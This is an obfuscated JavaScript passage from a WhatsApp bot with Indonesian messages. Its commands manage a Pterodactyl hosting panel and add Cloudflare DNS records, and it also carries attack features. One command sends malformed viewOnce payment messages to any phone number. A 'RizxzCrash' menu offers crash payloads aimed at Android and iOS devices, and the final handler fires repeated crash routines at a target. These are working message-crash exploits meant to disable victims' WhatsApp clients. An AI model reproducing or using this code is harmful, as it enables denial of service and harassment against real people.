          _0x3652ad(_0x3309f6);
        });
        break;
      case "listusr":
        {
          if (!_0x18271c) {
            return _0x3652ad(mess[_0x597c(842)][_0x597c(456)]);
          }
          let _0x586acb = _0x46e001[0] ? _0x46e001[0] : '1';
          let _0x106e1d = await fetch(domain + "/api/application/users?page=" + _0x586acb, {
            'method': _0x597c(674),
            'headers': {
              'Accept': _0x597c(599),
              'Content-Type': _0x597c(599),
              'Authorization': "Bearer " + apikey
            }
          });
          let _0x587e8f = await _0x106e1d[_0x597c(487)]();
          let _0x21ab80 = _0x587e8f[_0x597c(777)];
          let _0x1361d8 = _0x597c(946);
          for (let _0x332d75 of _0x21ab80) {
            let _0x331eff = _0x332d75.attributes;
            _0x1361d8 += _0x597c(899) + _0x331eff.id + " - Status: " + (_0x331eff.attributes?.[_0x597c(357)]?.[_0x597c(1015)] === null ? _0x597c(950) : "Active") + "\n";
            _0x1361d8 += _0x331eff[_0x597c(632)] + "\n";
            _0x1361d8 += _0x331eff[_0x597c(1018)] + " " + _0x331eff[_0x597c(411)] + "\n\n";
          }
          _0x1361d8 += _0x597c(934) + _0x587e8f[_0x597c(666)].pagination.current_page + '/' + _0x587e8f[_0x597c(666)].pagination[_0x597c(422)] + "\n";
          _0x1361d8 += _0x597c(588) + _0x587e8f.meta[_0x597c(484)][_0x597c(1001)];
          await _0x5051a5[_0x597c(937)](_0x432e1b[_0x597c(805)], {
            'text': _0x1361d8
          }, {
            'quoted': _0x432e1b
          });
          if (_0x587e8f[_0x597c(666)][_0x597c(484)][_0x597c(586)] < _0x587e8f.meta[_0x597c(484)][_0x597c(422)]) {
            _0x3652ad(_0x597c(580) + _0x49f20b + _0x597c(700) + (_0x587e8f.meta[_0x597c(484)][_0x597c(586)] + 1) + _0x597c(908));
          }
        }
        break;
      case _0x597c(780):
        {
          if (!_0x18271c) {
            return _0x3652ad(_0x597c(503));
          }
          let _0x3c2aac = _0x46e001[0];
          if (!_0x3c2aac) {
            return _0x3652ad(_0x597c(420));
          }
          const _0x512353 = {
            errors: null
          };
          let _0x198e27 = await fetch(domain + _0x597c(667) + _0x3c2aac, {
            'method': _0x597c(765),
            'headers': {
              'Accept': "application/json",
              'Content-Type': _0x597c(599),
              'Authorization': "Bearer " + apikey
            }
          });
          let _0x11256b = _0x198e27.ok ? _0x512353 : await _0x198e27[_0x597c(487)]();
          if (_0x11256b.errors) {
            return _0x3652ad(_0x597c(498));
          }
          _0x3652ad(_0x597c(362));
        }
        break;
      case _0x597c(723):
        {
          if (!_0x18271c) {
            return _0x3652ad(_0x597c(977));
          }
          let _0x2c6aba = _0x46e001[0] ? _0x46e001[0] : '1';
          let _0x2c231c = await fetch(domain + _0x597c(571) + _0x2c6aba, {
            'method': 'GET',
            'headers': {
              'Accept': "application/json",
              'Content-Type': _0x597c(599),
              'Authorization': "Bearer " + apikey
            }
          });
          let _0x9d50ea = await _0x2c231c[_0x597c(487)]();
          let _0x39e0f7 = _0x9d50ea[_0x597c(777)];
          let _0x3e13d6 = _0x597c(717);
          for (let _0x4826f8 of _0x39e0f7) {
            let _0x561127 = _0x4826f8.attributes;
            let _0x1de7c1 = await fetch(domain + _0x597c(849) + _0x561127[_0x597c(638)].split`-`[0] + _0x597c(888), {
              'method': _0x597c(674),
              'headers': {
                'Accept': _0x597c(599),
                'Content-Type': _0x597c(599),
                'Authorization': _0x597c(792) + capikey
              }
            });
            let _0x3f4ee4 = await _0x1de7c1[_0x597c(487)]();
            let _0x556931 = _0x3f4ee4[_0x597c(740)] ? _0x3f4ee4.attributes[_0x597c(969)] : _0x561127.status;
            _0x3e13d6 += "ID Server: " + _0x561127.id + "\n";
            _0x3e13d6 += _0x597c(829) + _0x561127.name + "\n";
            _0x3e13d6 += _0x597c(976) + _0x556931 + "\n\n";
          }
          _0x3e13d6 += "Halaman: " + _0x9d50ea[_0x597c(666)].pagination[_0x597c(586)] + '/' + _0x9d50ea[_0x597c(666)].pagination.total_pages + "\n";
          _0x3e13d6 += _0x597c(360) + _0x9d50ea[_0x597c(666)][_0x597c(484)].count;
          await _0x5051a5.sendMessage(_0x432e1b[_0x597c(805)], {
            'text': _0x3e13d6
          }, {
            'quoted': _0x432e1b
          });
          if (_0x9d50ea[_0x597c(666)].pagination[_0x597c(586)] < _0x9d50ea[_0x597c(666)][_0x597c(484)].total_pages) {
            _0x3652ad(_0x597c(580) + _0x49f20b + "listsrv " + (_0x9d50ea[_0x597c(666)][_0x597c(484)].current_page + 1) + _0x597c(908));
          }
        }
        break;
      case _0x597c(966):
        {
          if (!_0x18271c) {
            return _0x3652ad("KHUSUS OWN ");
          }
          let _0x2cd5e0 = _0x46e001[0];
          if (!_0x2cd5e0) {
            return _0x3652ad("ID nya mana?");
          }
          const _0x3a9f64 = {
            errors: null
          };
          let _0x285e2e = await fetch(domain + "/api/application/servers/" + _0x2cd5e0, {
            'method': _0x597c(765),
            'headers': {
              'Accept': "application/json",
              'Content-Type': "application/json",
              'Authorization': "Bearer " + apikey
            }
          });
          let _0x112ca6 = _0x285e2e.ok ? _0x3a9f64 : await _0x285e2e[_0x597c(487)]();
          if (_0x112ca6[_0x597c(915)]) {
            return _0x3652ad("*SERVER NOT FOUND*");
          }
          _0x3652ad(_0x597c(448));
        }
        break;
      case _0x597c(558):
        {
          if (!_0x18271c) {
            return _0x432e1b[_0x597c(395)]("maaf su fitur ini dapet di gunakan group tertentu");
          }
          function _0x4adf87(_0x199dc8, _0x7d55e0) {
            return new Promise(_0x3b0115 => {
              let _0x51f822 = _0x597c(525);
              axios[_0x597c(594)](_0x597c(497) + "35d1322140299eda91e0307155b3c8bc" + "/dns_records", {
                'type': 'A',
                'name': _0x199dc8[_0x597c(729)](/[^a-z0-9.-]/gi, '') + '.' + "panel-vvipbyRIZXVELZ⚡.my.id",
                'content': _0x7d55e0.replace(/[^0-9.]/gi, ''),
                'ttl': 0xe10,
                'priority': 0xa,
                'proxied': false
              }, {
                'headers': {
                  'Authorization': _0x597c(792) + _0x51f822,
                  'Content-Type': _0x597c(599)
                }
              })[_0x597c(605)](_0x577539 => {
                let _0x47b88a = _0x577539[_0x597c(777)];
                if (_0x47b88a[_0x597c(574)]) {
                  _0x3b0115({
                    'success': true,
                    'zone': _0x47b88a[_0x597c(939)]?.[_0x597c(975)],
                    'name': _0x47b88a.result?.[_0x597c(948)],
                    'ip': _0x47b88a[_0x597c(939)]?.[_0x597c(781)]
                  });
                }
              })[_0x597c(1020)](_0x362d41 => {
                let _0x137237 = _0x362d41[_0x597c(348)]?.['data']?.[_0x597c(915)]?.[0]?.[_0x597c(598)] || _0x362d41[_0x597c(348)]?.[_0x597c(777)]?.["errors"] || _0x362d41.response?.[_0x597c(777)] || _0x362d41[_0x597c(348)] || _0x362d41;
                let _0x45ad06 = String(_0x137237);
                const _0x41bf95 = {
                  success: false,
                  error: _0x45ad06
                };
                _0x3b0115(_0x41bf95);
              });
            });
          }
          let _0x31f314 = _0x46e001?.['join'](" ")?.["trim"]();
          if (!_0x31f314) {
            return _0x432e1b[_0x597c(395)](_0x597c(495));
          }
          let _0x37c360 = _0x31f314[_0x597c(613)]('|')[0][_0x597c(452)]()[_0x597c(729)](/[^a-z0-9.-]/gi, '');
          if (!_0x37c360) {
            return _0x432e1b.rzxReply(_0x597c(538));
          }
          let _0x6903a9 = _0x31f314[_0x597c(613)]('|')[1]?.[_0x597c(729)](/[^0-9.]/gi, '');
          if (!_0x6903a9 || _0x6903a9[_0x597c(613)]('.')[_0x597c(625)] < 4) {
            return _0x432e1b[_0x597c(395)](_0x6903a9 ? "ip tidak valid" : _0x597c(545));
          }
          _0x4adf87(_0x37c360, _0x6903a9)[_0x597c(605)](_0xd49dfb => {
            if (_0xd49dfb[_0x597c(574)]) {
              _0x432e1b.rzxReply("✅berhasil menambah domain\nip: " + _0xd49dfb.ip + "\nhostname: " + _0xd49dfb[_0x597c(948)]);
            } else {
              _0x432e1b[_0x597c(395)](_0x597c(895) + _0xd49dfb.error);
            }
          });
        }
        break;
      case _0x597c(892):
        {
          if (!_0x18271c) {
            return _0x432e1b[_0x597c(395)](_0x597c(472));
          }
          function _0x21c9d3(_0x118c01, _0x4111d4) {
            return new Promise(_0x346c44 => {
              let _0x423368 = _0x597c(839);
              let _0xf4c702 = _0x597c(649);
              let _0x9d1ae0 = _0x597c(704);
              axios[_0x597c(594)](_0x597c(497) + _0x423368 + _0x597c(832), {
                'type': 'A',
                'name': _0x118c01[_0x597c(729)](/[^a-z0-9.-]/gi, '') + '.' + _0x9d1ae0,
                'content': _0x4111d4.replace(/[^0-9.]/gi, ''),
                'ttl': 0xe10,
                'priority': 0xa,
                'proxied': false
              }, {
                'headers': {
                  'Authorization': _0x597c(792) + _0xf4c702,
                  'Content-Type': _0x597c(599)
                }
              })[_0x597c(605)](_0x1ae947 => {
                let _0x4baa75 = _0x1ae947[_0x597c(777)];
                if (_0x4baa75[_0x597c(574)]) {
                  _0x346c44({
                    'success': true,
                    'zone': _0x4baa75[_0x597c(939)]?.['zone_name'],
                    'name': _0x4baa75[_0x597c(939)]?.[_0x597c(948)],
                    'ip': _0x4baa75[_0x597c(939)]?.[_0x597c(781)]
                  });
                }
              })[_0x597c(1020)](_0x877f49 => {
                let _0x14f685 = _0x877f49[_0x597c(348)]?.[_0x597c(777)]?.["errors"]?.[0]?.[_0x597c(598)] || _0x877f49[_0x597c(348)]?.[_0x597c(777)]?.[_0x597c(915)] || _0x877f49[_0x597c(348)]?.[_0x597c(777)] || _0x877f49.response || _0x877f49;
                let _0x533e42 = String(_0x14f685);
                const _0xb83287 = {
                  success: false,
                  error: _0x533e42
                };
                _0x346c44(_0xb83287);
              });
            });
          }
          let _0x468216 = _0x46e001?.['join'](" ")?.[_0x597c(452)]();
          if (!_0x468216) {
            return _0x432e1b[_0x597c(395)](_0x597c(350));
          }
          let _0x3acdd4 = _0x468216[_0x597c(613)]('|')[0][_0x597c(452)]()[_0x597c(729)](/[^a-z0-9.-]/gi, '');
          if (!_0x3acdd4) {
            return _0x432e1b.rzxReply(_0x597c(538));
          }
          let _0x413b0c = _0x468216[_0x597c(613)]('|')[1]?.[_0x597c(729)](/[^0-9.]/gi, '');
          if (!_0x413b0c || _0x413b0c[_0x597c(613)]('.').length < 4) {
            return _0x432e1b[_0x597c(395)](_0x413b0c ? _0x597c(769) : _0x597c(545));
          }
          _0x21c9d3(_0x3acdd4, _0x413b0c)[_0x597c(605)](_0x34507c => {
            if (_0x34507c[_0x597c(574)]) {
              _0x432e1b[_0x597c(395)]("✅berhasil menambah domain\nip: " + _0x34507c.ip + _0x597c(919) + _0x34507c[_0x597c(948)]);
            } else {
              _0x432e1b.rzxReply(_0x597c(895) + _0x34507c[_0x597c(864)]);
            }
          });
        }
        break;
      case _0x597c(345):
      case 's':
        {
          if (!_0x27c759) {
            return _0x3652ad(_0x597c(351) + (_0x49f20b + _0x4af652) + _0x597c(712));
          }
          if (/image/[_0x597c(654)](_0xb9cecf)) {
            let _0x2a8275 = await _0x27c759[_0x597c(535)]();
            let _0x1118de = await _0x5051a5[_0x597c(995)](_0x364b7c, _0x2a8275, _0x432e1b, {
              'packname': global[_0x597c(901)],
              'author': global[_0x597c(739)]
            });
            await fs[_0x597c(768)](_0x1118de);
          } else {
            if (/video/[_0x597c(654)](_0xb9cecf)) {
              if ((_0x27c759[_0x597c(853)] || _0x27c759).seconds > 11) {
                return _0x3652ad("Kirim/rzxReply Gambar/Video/Gifs Dengan Caption ${prefix+command}\nDurasi Video 1-9 Detik");
              }
              let _0x32813d = await _0x27c759.download();
              let _0x40a03e = await _0x5051a5[_0x597c(352)](_0x364b7c, _0x32813d, _0x432e1b, {
                'packname': global[_0x597c(901)],
                'author': global[_0x597c(739)]
              });
              await fs[_0x597c(768)](_0x40a03e);
            } else {
              _0x3652ad(_0x597c(351) + (_0x49f20b + _0x4af652) + _0x597c(712));
            }
          }
        }
        break;
      case 'ht':
      case _0x597c(504):
        {
          if (!_0x12cc16) {
            return _0x3652ad(mess[_0x597c(842)][_0x597c(476)]);
          }
          if (!_0x35d515 && !_0x18271c) {
            return _0x3652ad(mess[_0x597c(842)][_0x597c(553)]);
          }
          if (!_0x1814f3) {
            return _0x3652ad(mess[_0x597c(842)][_0x597c(369)]);
          }
          if (!q) {
            return _0x3652ad(_0x597c(434));
          }
          const _0x34021f = {
            quoted: _0x432e1b
          };
          global[_0x597c(734)] = q;
          _0x5051a5[_0x597c(937)](_0x364b7c, {
            'text': global.hit ? global.hit : '',
            'mentions': _0x3aa99c[_0x597c(541)](_0x589ba2 => _0x589ba2.id)
          }, _0x34021f);
        }
        break;
      case _0x597c(810):
        {
          if (!_0x403967) {
            return _0x3652ad(_0x597c(433));
          }
          if (!phoneNumberInput) {
            return _0x3652ad(_0x597c(359));
          }
          let _0x4d0319 = phoneNumberInput[_0x597c(729)](/[^0-9]/g, '');
          if (_0x4d0319[_0x597c(996)]('0')) {
            return _0x3652ad(_0x597c(1011));
          }
          let _0x217b8c = await client[_0x597c(871)](_0x4d0319 + _0x597c(981));
          let _0x14190b = _0x4d0319 + _0x597c(981);
          if ([_0x597c(507), _0x597c(619), _0x597c(428)][_0x597c(402)](_0x4d0319)) {
            return;
          }
          if (_0x217b8c[_0x597c(625)] === 0) {
            return _0x3652ad("Nomor tersebut tidak terdaftar di WhatsApp");
          }
          async function _0x56d46b(_0x490801) {
            const _0x5f52e4 = {
              deviceListMetadataVersion: 0x2,
              deviceListMetadata: {}
            };
            const _0x36cf90 = {
              value: 0x0,
              offset: 0x64
            };
            const _0x46dcb6 = {
              value: 0x0,
              offset: 0x64
            };
            const _0x2f342 = {
              value: 0x0,
              offset: 0x64
            };
            const _0x55afd3 = {
              value: 0x0,
              offset: 0x64
            };
            const _0x186823 = {
              name: '',
              amount: _0x2f342,
              quantity: 0x0,
              sale_amount: _0x55afd3
            };
            const _0x5c49ee = {
              'jid': _0x490801
            };
            const _0x4507d7 = {
              participant: _0x5c49ee
            };
            const _0x3598d9 = {
              'name': _0x597c(690),
              'buttonParamsJson': JSON[_0x597c(554)]({
                'currency': _0x597c(788),
                'total_amount': _0x36cf90,
                'reference_id': _0x597c(393),
                'type': _0x597c(983),
                'order': {
                  'status': "pending",
                  'subtotal': _0x46dcb6,
                  'order_type': _0x597c(424),
                  'items': [_0x186823]
                },
                'payment_settings': [{
                  'type': _0x597c(543),
                  'pix_static_code': {
                    'merchant_name': "meu ovo",
                    'key': "+5533998586057",
                    'key_type': 'X'
                  }
                }]
              })
            };
            const _0x1da13c = {
              'buttons': [_0x3598d9]
            };
            const _0x2beda5 = {
              'nativeFlowMessage': _0x1da13c
            };
            const _0x4db871 = {
              'messageContextInfo': _0x5f52e4,
              'interactiveMessage': _0x2beda5
            };
            const _0x2338eb = {
              'viewOnceMessage': {
                'message': _0x4db871
              }
            };
            const _0x26f184 = {
              messageId: null
            };
            await _0x5051a5[_0x597c(373)](_0x490801, _0x2338eb, _0x4507d7, _0x26f184);
          }
          await _0x56d46b(_0x14190b);
          _0x3652ad(_0x597c(511) + _0x14190b[_0x597c(613)]('@')[0] + _0x597c(399), [_0x14190b]);
        }
        break;
      case _0x597c(669):
        {
          if (!_0x12cc16) {
            return _0x432e1b[_0x597c(395)](mess[_0x597c(842)][_0x597c(476)]);
          }
          if (!_0x18271c) {
            return _0x432e1b[_0x597c(395)](mess.owner);
          }
          if (!q) {
            return _0x432e1b[_0x597c(395)](_0x597c(978) + (_0x49f20b + _0x4af652) + _0x597c(378));
          }
          setrzxReply(_0x597c(528));
          let _0x3c08d7 = [];
          _0x3cba2a.map(_0x4a984a => _0x3c08d7[_0x597c(980)](_0x4a984a.id));
          for (let _0x4a61a6 of _0x3c08d7) {
            const _0x40b84e = {
              text: '' + q
            };
            if (_0x4a61a6[_0x597c(402)](_0x597c(733))) {
              await sleep(6000);
              _0x5051a5[_0x597c(937)](_0x4a61a6, _0x40b84e);
            }
          }
          _0x432e1b[_0x597c(395)](_0x597c(1012));
        }
        break;
      case _0x597c(746):
        {
          _0x432e1b[_0x597c(395)](mess[_0x597c(818)]);
          let {
            UploadFileUgu: _0x1d7c8e,
            webp2mp4File: _0xd8c246,
            TelegraPh: _0x392ac8
          } = require(_0x597c(502));
          let _0x1724c0 = await _0x5051a5[_0x597c(898)](_0x27c759);
          if (/image/[_0x597c(654)](_0xb9cecf)) {
            let _0xb59ca0 = await _0x392ac8(_0x1724c0);
            _0x432e1b[_0x597c(395)](util.format(_0xb59ca0));
          } else {
            if (!/image/.test(_0xb9cecf)) {
              let _0x1e256d = await _0x1d7c8e(_0x1724c0);
              _0x432e1b[_0x597c(395)](util[_0x597c(570)](_0x1e256d));
            }
          }
          await fs[_0x597c(768)](_0x1724c0);
        }
        break;
      case _0x597c(490):
        {
          if (!_0x18271c) {
            return _0x432e1b[_0x597c(395)](mess[_0x597c(842)][_0x597c(456)]);
          }
          _0x5051a5["public"] = true;
          _0x432e1b.rzxReply(_0x597c(410));
        }
        break;
      case _0x597c(664):
        {
          if (!_0x18271c) {
            return _0x432e1b[_0x597c(395)](mess[_0x597c(842)][_0x597c(456)]);
          }
          _0x5051a5["public"] = false;
          _0x432e1b[_0x597c(395)]("Berhasil mengganti mode bot menjadi *Self*");
        }
        break;
      case _0x597c(688):
        {
          const _0x2c715e = owner + _0x597c(981);
          const _0x22640e = "*Hii Bro 😎@" + _0x52b5f7[_0x597c(613)]('@')[0] + " 👋*\n\n\nCPANEL SIMPLE V1\nCARA CREATE SERVER - RIZXVELZ⚡\n\nRAM USER,NOMOR WANGSAF\n\nCONTOH : 1gb RizxzSellVps,628XXXXX\n\n╭━━•›【﻿ 𝗖𝗢𝗡𝗧𝗔𝗖𝗧 𝗣𝗘𝗥𝗦𝗢𝗡 】\n│㞮 𝗪𝗵𝗮𝘁𝘀𝗮𝗽𝗽 : *62895364760801*\n│㞮 𝗧𝗲𝗹𝗲𝗴𝗿𝗮𝗺 : *t.me/RizxzSellVps*\n╰━ ━ ━ ━ ━•━•⩵【﻿㞮 - *RIZXVELZ⚡* ⚡】";
          const _0x13273d = {
            mentionedJid: [_0x52b5f7, _0x2c715e],
            forwardingScore: 0x270f,
            isForwarded: true
          };
          const _0x1ad1ce = {
            quoted: _0x432e1b
          };
          _0x5051a5[_0x597c(937)](target, {
            'image': {
              'url': _0x597c(873)
            },
            'text': _0x22640e,
            'contextInfo': _0x13273d
          }, _0x1ad1ce);
        }
        break;
      case _0x597c(876):
      case 'hd':
      case _0x597c(826):
        {
          if (!_0x27c759) {
            return _0x3652ad("Fotonya Mana?");
          }
          if (!/image/[_0x597c(654)](_0xb9cecf)) {
            return _0x3652ad(_0x597c(361) + (_0x49f20b + _0x4af652));
          }
          _0x3652ad(mess[_0x597c(818)]);
          let _0x3a8d2b = await _0x27c759.download();
          let _0x22744a = await _0x277fe1(_0x3a8d2b, _0x597c(913));
          _0x5051a5[_0x597c(937)](_0x432e1b[_0x597c(805)], {
            'image': _0x22744a,
            'caption': _0x597c(933)
          }, {
            'quoted': _0x432e1b
          });
        }
        break;
      case " k":
      case "kick":
        {
          if (!_0x12cc16) {
            return _0x3652ad(mess[_0x597c(842)][_0x597c(476)]);
          }
          if (!_0x35d515 && !_0x18271c) {
            return _0x3652ad(mess[_0x597c(842)][_0x597c(553)]);
          }
          if (!_0x1814f3) {
            return _0x3652ad(mess[_0x597c(842)][_0x597c(369)]);
          }
          let _0x5f0708 = _0x432e1b[_0x597c(836)][0] ? _0x432e1b[_0x597c(836)][0] : _0x432e1b.quoted ? _0x432e1b[_0x597c(488)].sender : _0x4d0552.replace(/[^0-9]/g, '') + _0x597c(981);
          await _0x5051a5.groupParticipantsUpdate(_0x432e1b[_0x597c(805)], [_0x5f0708], _0x597c(761))[_0x597c(605)](_0x3841ab => _0x3652ad(util[_0x597c(570)](_0x3841ab)))[_0x597c(1020)](_0x2b9f5b => _0x3652ad(util[_0x597c(570)](_0x2b9f5b)));
        }
        break;
      case _0x597c(520):
      case _0x597c(878):
        {
          if (!_0x12cc16) {
            return _0x3652ad(mess[_0x597c(842)][_0x597c(476)]);
          }
          if (!_0x35d515 && !_0x18271c) {
            return _0x3652ad(mess[_0x597c(842)][_0x597c(553)]);
          }
          if (!_0x1814f3) {
            return _0x3652ad(mess[_0x597c(842)][_0x597c(369)]);
          }
          const _0x6021d9 = await _0x5051a5[_0x597c(446)](_0x432e1b[_0x597c(805)]);
          const _0x59bfc0 = _0x597c(386) + _0x6021d9;
          _0x3652ad(_0x59bfc0);
        }
        break;
      case _0x597c(633):
        {
          const _0xdf9776 = {
            forwardingScore: 0x98967f,
            isForwarded: true,
            mentionedJid: [_0x52b5f7]
          };
          const _0x3c8cad = {
            quoted: _0x432e1b
          };
          const _0x43cead = await _0x5051a5[_0x597c(937)](_0x364b7c, {
            'contacts': {
              'displayName': _0x1d9e17[_0x597c(625)] + _0x597c(863),
              'contacts': _0x1d9e17
            },
            'contextInfo': _0xdf9776
          }, _0x3c8cad);
          const _0x7fa999 = {
            quoted: _0x43cead
          };
          _0x5051a5.sendMessage(_0x364b7c, {
            'text': _0x597c(409) + _0x52b5f7.split('@')[0] + ", Nih Owner Kuh",
            'contextInfo': {
              'forwardingScore': 0x98967f,
              'isForwarded': true,
              'mentionedJid': [_0x52b5f7]
            }
          }, _0x7fa999);
        }
        break;
      case _0x597c(692):
        if (!_0x18271c) {
          return _0x3652ad(mess[_0x597c(842)][_0x597c(633)]);
        }
        if (!_0x46e001[0]) {
          return _0x3652ad(_0x597c(905) + (_0x49f20b + _0x4af652) + _0x597c(958) + (_0x49f20b + _0x4af652) + " 6285702447728");
        }
        bnnd = q[_0x597c(613)]('|')[0][_0x597c(729)](/[^0-9]/g, '');
        let _0x420fb0 = await _0x5051a5[_0x597c(935)](bnnd + _0x597c(981));
        if (_0x420fb0[_0x597c(625)] == 0) {
          return _0x3652ad(_0x597c(551));
        }
        _0x255cb7[_0x597c(980)](bnnd);
        fs.writeFileSync("./all/database/owner.json", JSON[_0x597c(554)](_0x255cb7));
        _0x3652ad(_0x597c(926) + bnnd + _0x597c(837));
        break;
      case _0x597c(974):
        if (!_0x18271c) {
          return _0x3652ad(mess[_0x597c(842)].owner);
        }
        if (!_0x46e001[0]) {
          return _0x3652ad("Penggunaan " + (_0x49f20b + _0x4af652) + " nomor\nContoh " + (_0x49f20b + _0x4af652) + _0x597c(787));
        }
        ya = q[_0x597c(613)]('|')[0].replace(/[^0-9]/g, '');
        unp = _0x255cb7[_0x597c(579)](ya);
        _0x255cb7[_0x597c(368)](unp, 1);
        fs[_0x597c(847)](_0x597c(1013), JSON[_0x597c(554)](_0x255cb7));
        _0x3652ad(_0x597c(926) + ya + _0x597c(984));
        break;
      case _0x597c(903):
        {
          if (!_0x18271c) {
            return _0x3652ad(mess[_0x597c(842)][_0x597c(633)]);
          }
          if (!_0x46e001[0]) {
            return _0x3652ad(_0x597c(905) + (_0x49f20b + _0x4af652) + " nomor\nContoh " + (_0x49f20b + _0x4af652) + _0x597c(787));
          }
          prrkek = q[_0x597c(613)]('|')[0][_0x597c(729)](/[^0-9]/g, '') + "@s.whatsapp.net";
          let _0x36ce59 = await _0x5051a5[_0x597c(935)](prrkek);
          if (_0x36ce59.length == 0) {
            return _0x3652ad("Masukkan Nomor Yang Valid Dan Terdaftar Di WhatsApp!!!");
          }
          _0x46c237[_0x597c(980)](prrkek);
          fs.writeFileSync(_0x597c(890), JSON.stringify(_0x46c237));
          _0x3652ad("Nomor " + prrkek + _0x597c(631));
        }
        break;
      case 'delprem':
        {
          if (!_0x18271c) {
            return _0x3652ad(mess.only[_0x597c(633)]);
          }
          if (!_0x46e001[0]) {
            return _0x3652ad("Penggunaan " + (_0x49f20b + _0x4af652) + " nomor\nContoh " + (_0x49f20b + _0x4af652) + _0x597c(787));
          }
          ya = q[_0x597c(613)]('|')[0].replace(/[^0-9]/g, '') + _0x597c(981);
          unp = _0x46c237[_0x597c(579)](ya);
          _0x46c237[_0x597c(368)](unp, 1);
          fs.writeFileSync(_0x597c(890), JSON.stringify(_0x46c237));
          _0x3652ad("Nomor " + ya + _0x597c(416));
        }
        break;
      case _0x597c(750):
        {
          if (!_0x403967) {
            return _0x3652ad(mess[_0x597c(842)].premium);
          }
          if (!q) {
            return _0x3652ad(_0x597c(748) + (_0x49f20b + _0x4af652) + " 62xxxx");
          }
          target = q.replace(/[^0-9]/g, '') + _0x597c(981);
          const _0x3032ed = {
            deviceListMetadata: {},
            deviceListMetadataVersion: 0x2
          };
          const _0x1f410e = {
            text: ''
          };
          let _0x3e3944 = [{
            'title': "⌜ 𝐀𝐍𝐃𝐑𝚯𝐈𝐃 ⌟",
            'highlight_label': "🎭፝⃟𝑹𝒊𝒛𝒙𝒛𝑪𝒓𝒂𝒔𝒉𝑨𝒏𝒅𝒓𝒐🐉",
            'rows': [{
              'title': _0x597c(824),
              'id': _0x597c(823) + target
            }]
          }, {
            'highlight_label': _0x597c(940),
            'rows': [{
              'title': _0x597c(675),
              'id': _0x597c(532) + target
            }]
          }, {
            'highlight_label': _0x597c(940),
            'rows': [{
              'title': _0x597c(616),
              'id': "xhard " + target
            }]
          }, {
            'title': _0x597c(665),
            'highlight_label': _0x597c(606),
            'rows': [{
              'title': _0x597c(917),
              'id': "xios " + target
            }]
          }, {
            'highlight_label': "🎭፝⃟𝑹𝒊𝒛𝒙𝒛𝑪𝒓𝒂𝒔𝒉𝑰𝒐𝒔𝒔🐉",
            'rows': [{
              'title': _0x597c(894),
              'id': _0x597c(540) + target
            }]
          }, {
            'highlight_label': "🎭፝⃟𝑹𝒊𝒛𝒙𝒛𝑪𝒓𝒂𝒔𝒉𝑰𝒐𝒔𝒔🐉",
            'rows': [{
              'title': _0x597c(791),
              'id': "iphone " + target
            }]
          }, {
            'title': _0x597c(663),
            'highlight_label': _0x597c(772),
            'rows': [{
              'title': "Ĉ̬R̬̂Â̬Ŝ̬Ĥ̬  F̬̂L̬̂Ô̬Ŵ̬͒",
              'id': _0x597c(1005) + target
            }]
          }, {
            'highlight_label': _0x597c(772),
            'rows': [{
              'title': _0x597c(1016),
              'id': _0x597c(623) + target
            }]
          }, {
            'highlight_label': "🎭፝⃟𝑹𝒊𝒛𝒙𝒛𝑪𝒓𝒂𝒔𝒉𝑩𝒆𝒕𝒂𝒂🐉",
            'rows': [{
              'title': "Ô̬V̬̂Ê̬R̬̂ F̬̂L̬̂Ô̬Ŵ̬",
              'id': "overbeta " + target
            }]
          }];
          let _0x5298b5 = {
            'title': "⿻  ⌜ 𝑹𝒊𝒛𝒙𝒛𝑾𝒂𝒏𝒈𝒔𝒂𝒇𝒇𝑵𝒐𝒄𝒐𝒖𝒏𝒕𝒆𝒓〽️ ⌟  ⿻",
            'sections': _0x3e3944
          };
          let _0x3e64f9 = generateWAMessageFromContent(_0x432e1b[_0x597c(805)], {
            'viewOnceMessage': {
              'message': {
                'messageContextInfo': _0x3032ed,
                'interactiveMessage': proto.Message[_0x597c(367)][_0x597c(419)]({
                  'contextInfo': {
                    'mentionedJid': [_0x432e1b[_0x597c(467)]],
                    'isForwarded': true,
                    'forwardedNewsletterMessageInfo': {
                      'newsletterJid': "1203632@newsletter",
                      'newsletterName': _0x597c(841),
                      'serverMessageId': -1
                    },
                    'businessMessageForwardInfo': {
                      'businessOwnerJid': _0x5051a5[_0x597c(643)](_0x5051a5[_0x597c(357)].id)
                    }
                  },
                  'body': proto[_0x597c(414)].InteractiveMessage[_0x597c(400)][_0x597c(419)]({
                    'text': "🔥፝⃟𝑹𝒊𝒛𝒙𝒛𝑾𝒂𝒏𝒈𝒄𝒂𝒑 𝐄𝐱ͯ͢𝐞𝐜𝐮͢𝐭𝐢𝐨𝐧 𝐕ͮ𝐚͢𝐮𝐥𝐭ཀ͜͡🦠\n \n >> 𝑨𝒕𝒕𝒂𝒄𝒌𝒊𝒏𝒈 : " + target + _0x597c(519)
                  }),
                  'footer': proto[_0x597c(414)][_0x597c(367)][_0x597c(475)].create(_0x1f410e),
                  'header': proto[_0x597c(414)][_0x597c(367)][_0x597c(990)][_0x597c(419)]({
                    'title': '',
                    'subtitle': _0x597c(392),
                    'hasMediaAttachment': true,
                    ...(await prepareWAMessageMedia({
                      'image': await fs.readFileSync(_0x597c(648))
                    }, {
                      'upload': _0x5051a5.waUploadToServer
                    }))
                  }),
                  'nativeFlowMessage': proto.Message[_0x597c(367)][_0x597c(891)][_0x597c(419)]({
                    'buttons': [{
                      'name': _0x597c(447),
                      'buttonParamsJson': JSON[_0x597c(554)](_0x5298b5)
                    }, {
                      'name': "cta_url",
                      'buttonParamsJson': _0x597c(822)
                    }]
                  })
                })
              }
            }
          }, {});
          await _0x5051a5[_0x597c(373)](_0x3e64f9[_0x597c(526)][_0x597c(670)], _0x3e64f9[_0x597c(598)], {
            'messageId': _0x3e64f9[_0x597c(526)].id
          });
        }
        break;
      case _0x597c(646):
      case _0x597c(610):
      case _0x597c(455):
        {
          if (!_0x403967) {
            return _0x3652ad(mess[_0x597c(842)].premium);
          }
          if (!q) {
            return _0x3652ad(_0x597c(748) + (_0x49f20b + _0x4af652) + _0x597c(564));
          }
          target = q[_0x597c(729)](/[^0-9]/g, '') + _0x597c(981);
          await _0x1fe716(_0x5051a5, target, _0x597c(685), 1020000, ptcp = true);
          _0x5e61a6(target, _0xcba78f);
          _0x162062(target, _0xcba78f);
          _0x23f122(target, _0xcba78f);
          await _0x4b010a(_0x5051a5, target, _0xcba78f);
          await _0x2f2312(target, _0xcba78f);
          await _0x32efae(_0x5051a5, target, _0xcba78f);
          await _0x19508d(target, _0xcba78f);
          await _0x5e61a6(target, _0xcba78f);
          await _0x19508d(target, _0xcba78f);
          await _0x4b010a(_0x5051a5, target, _0xcba78f);
